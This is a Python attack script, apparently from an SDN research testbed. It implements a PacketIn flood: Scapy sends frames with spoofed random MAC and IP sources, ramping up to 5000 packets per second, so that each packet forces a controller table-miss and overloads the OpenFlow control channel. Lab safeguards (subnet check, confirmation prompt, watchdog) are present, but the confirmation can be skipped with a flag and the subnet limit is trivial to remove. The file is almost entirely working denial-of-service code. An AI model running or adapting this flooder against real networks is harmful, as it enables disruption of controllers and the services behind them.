#!/usr/bin/env python3
"""
attacks/packetin_flood.py
--------------------------
Phase 5 — Attack Module 1: PacketIn Flood (North-South)

Strategy
────────
This script is launched FROM INSIDE a Mininet host's network namespace
(e.g. via net.get('h1').cmd('python3 attacks/packetin_flood.py ...')
or by running it directly inside the namespace).

It uses Scapy to craft Ethernet/IP frames with spoofed, randomised source
MACs and IPs.  Because the switch's flow-table will have no entry for each
novel spoofed source, every single packet triggers a PACKET_IN event to the
domain controller — saturating the control channel (OpenFlow TCP socket) and
the controller's CPU with table-miss processing.

Safety harness
──────────────
  1. validate_target()     — refuses any IP outside 10.0.0.0/24
  2. confirm_before_run()  — interactive yes/no gate
  3. safe_rate_ramp()      — starts at START_RATE pkt/s, ramps to MAX_RATE
  4. start_watchdog()      — kills the process if it outlives MAX_DURATION

Run example (from the Mininet host namespace, e.g. h1):
    python3 attacks/packetin_flood.py \
        --target 10.0.0.9 \
        --iface h1-eth0 \
        --start-rate 500 \
        --max-rate 5000 \
        --step 500 \
        --duration 120
"""

from __future__ import annotations

import argparse
import logging
import os
import sys
import time
from datetime import datetime, timezone

# ── Project path ──────────────────────────────────────────────────────────────
_HERE = os.path.dirname(os.path.abspath(__file__))
_ROOT = os.path.dirname(_HERE)
if _ROOT not in sys.path:
    sys.path.insert(0, _ROOT)

from attacks.safety import (
    validate_target,
    confirm_before_run,
    safe_rate_ramp,
    start_watchdog,
    ALLOWED_SUBNET,
)

# ── Logging ───────────────────────────────────────────────────────────────────
RESULTS_DIR = os.path.join(_ROOT, "results")
os.makedirs(RESULTS_DIR, exist_ok=True)

_ts = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
LOG_FILE = os.path.join(RESULTS_DIR, f"attack_packetin_{_ts}.log")

_fmt = logging.Formatter(
    "%(asctime)s  %(levelname)-8s  %(message)s", datefmt="%Y-%m-%dT%H:%M:%S"
)
_fh = logging.FileHandler(LOG_FILE, mode="w", encoding="utf-8")
_sh = logging.StreamHandler(sys.stdout)
for _h in (_fh, _sh):
    _h.setFormatter(_fmt)

log = logging.getLogger("packetin_flood")
log.setLevel(logging.DEBUG)
log.propagate = False
log.addHandler(_fh)
log.addHandler(_sh)

# ── Attack defaults ───────────────────────────────────────────────────────────
DEFAULT_TARGET     = "10.0.0.9"   # default victim IP (Mininet only)
DEFAULT_IFACE      = "h1-eth0"    # must be a Mininet interface
DEFAULT_START_RATE = 500           # pkt/s
DEFAULT_MAX_RATE   = 5000          # pkt/s — escalated from 500; earlier runs at 300
                                    # showed <12% latency delta (within jitter);
                                    # higher rates needed to find controller saturation point
DEFAULT_STEP       = 500           # pkt/s increase per ramp step
DEFAULT_RAMP_INTER = 10.0          # seconds between ramp steps
DEFAULT_DURATION   = 120           # seconds (hard maximum: 600s via watchdog)
TARGET_CONTROLLER  = "Domain-A controller (port 6633)"


# ── Flood implementation ──────────────────────────────────────────────────────

def _random_mac() -> str:
    """Return a random locally-administered unicast MAC."""
    import random
    mac = [random.randint(0, 255) for _ in range(6)]
    mac[0] = (mac[0] & 0xFE) | 0x02   # locally administered, unicast
    return ":".join(f"{b:02x}" for b in mac)


def _random_ip_in_subnet() -> str:
    """Return a random 10.0.0.x address (x in 1-254)."""
    import random
    return f"10.0.0.{random.randint(1, 254)}"


def _build_packet(dst_ip: str):
    """Craft one spoofed Ethernet/IP packet with a random src MAC and src IP."""
    from scapy.all import Ether, IP, UDP, Raw  # type: ignore[import]
    src_mac = _random_mac()
    src_ip  = _random_ip_in_subnet()
    pkt = (
        Ether(src=src_mac, dst="ff:ff:ff:ff:ff:ff")
        / IP(src=src_ip, dst=dst_ip, ttl=64)
        / UDP(sport=12345, dport=9)
        / Raw(load=b"FLOOD")
    )
    return pkt


def run_flood(target_ip: str, iface: str, rate: float,
              stop_event) -> None:
    """Send spoofed packets at `rate` pkt/s until stop_event is set."""
    from scapy.all import sendp  # type: ignore[import]
    interval = 1.0 / rate
    while not stop_event.is_set():
        pkt = _build_packet(target_ip)
        try:
            sendp(pkt, iface=iface, verbose=False)
        except Exception as exc:
            log.error("sendp error: %s", exc)
            break
        time.sleep(interval)


# ── Main ──────────────────────────────────────────────────────────────────────

def main() -> int:
    parser = argparse.ArgumentParser(
        description=(
            "PacketIn flood — spoof random MACs/IPs toward a Mininet host to "
            "saturate the controller's control channel.  MUST run inside the "
            "Mininet host's network namespace."
        )
    )
    parser.add_argument("--target",     default=DEFAULT_TARGET,
                        help=f"Victim IP address (must be in {ALLOWED_SUBNET})")
    parser.add_argument("--iface",      default=DEFAULT_IFACE,
                        help="Mininet host network interface (e.g. h1-eth0)")
    parser.add_argument("--start-rate", type=int, default=DEFAULT_START_RATE,
                        help="Initial packet rate (pkt/s)")
    parser.add_argument("--max-rate",   type=int, default=DEFAULT_MAX_RATE,
                        help="Maximum packet rate (pkt/s)")
    parser.add_argument("--step",       type=int, default=DEFAULT_STEP,
                        help="Rate increment per ramp step (pkt/s)")
    parser.add_argument("--ramp-interval", type=float, default=DEFAULT_RAMP_INTER,
                        help="Seconds to hold each rate before stepping up")
    parser.add_argument("--duration",   type=int, default=DEFAULT_DURATION,
                        help="Hard upper bound on attack duration (seconds, max 600)")
    parser.add_argument("--yes",        action="store_true",
                        help="Bypass interactive confirmation")
    args = parser.parse_args()

    target   = args.target
    iface    = args.iface
    duration = args.duration

    # ── Safety gate 1: validate target ───────────────────────────────────────
    log.info("Validating target IP: %s", target)
    try:
        validate_target(target)
        validate_target(iface)          # also validate the interface name
    except Exception as exc:
        log.error("SAFETY VIOLATION — %s", exc)
        print(f"\n[BLOCKED] {exc}", file=sys.stderr)
        return 2

    # ── Safety gate 2: interactive confirmation ───────────────────────────────
    confirmed = confirm_before_run(
        attack_name="PacketIn Flood (North-South)",
        target=f"{target} via {iface} → {TARGET_CONTROLLER}",
        rate=f"{args.start_rate}–{args.max_rate} pkt/s (ramped)",
        duration=duration,
        auto_confirm=args.yes,
    )
    if not confirmed:
        log.info("User aborted. No traffic sent.")
        return 0

    # ── Safety gate 3: watchdog ───────────────────────────────────────────────
    watchdog = start_watchdog(duration)
    log.info("Watchdog armed for %d seconds.", duration)

    # ── Attack start ──────────────────────────────────────────────────────────
    import threading
    stop_event = threading.Event()
    attack_start = datetime.now(timezone.utc).isoformat()
    log.info("=" * 60)
    log.info("ATTACK START  %s", attack_start)
    log.info("  Target IP       : %s", target)
    log.info("  Interface       : %s", iface)
    log.info("  Target ctrl     : %s", TARGET_CONTROLLER)
    log.info("  Rate ramp       : %d → %d pkt/s  step=%d  interval=%.1fs",
             args.start_rate, args.max_rate, args.step, args.ramp_interval)
    log.info("  Max duration    : %d s", duration)
    log.info("  Log file        : %s", LOG_FILE)
    log.info("=" * 60)

    flood_thread = None
    try:
        for rate in safe_rate_ramp(
            start_rate=float(args.start_rate),
            max_rate=float(args.max_rate),
            step=float(args.step),
            interval=args.ramp_interval,
        ):
            log.info("RAMP STEP — setting rate to %.0f pkt/s  (target=%s)",
                     rate, target)

            # Stop previous flood thread if running
            if flood_thread and flood_thread.is_alive():
                stop_event.set()
                flood_thread.join(timeout=3)
                stop_event.clear()

            flood_thread = threading.Thread(
                target=run_flood,
                args=(target, iface, rate, stop_event),
                daemon=True,
                name=f"flood-{int(rate)}",
            )
            flood_thread.start()
            # Hold this rate for ramp_interval seconds before safe_rate_ramp
            # yields the next step (the sleep is inside safe_rate_ramp itself)

        # Hold at max rate until duration expires or watchdog fires
        remaining = duration - args.ramp_interval * (
            (args.max_rate - args.start_rate) // max(args.step, 1) + 1
        )
        remaining = max(remaining, 0)
        if remaining > 0:
            log.info("Holding max rate %.0f pkt/s for %.0f more seconds.",
                     args.max_rate, remaining)
            time.sleep(remaining)

    except KeyboardInterrupt:
        log.info("Keyboard interrupt — stopping flood.")
    finally:
        stop_event.set()
        if flood_thread and flood_thread.is_alive():
            flood_thread.join(timeout=5)
        watchdog.cancel()
        attack_stop = datetime.now(timezone.utc).isoformat()
        log.info("ATTACK STOP   %s", attack_stop)
        log.info("Results written to: %s", LOG_FILE)

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
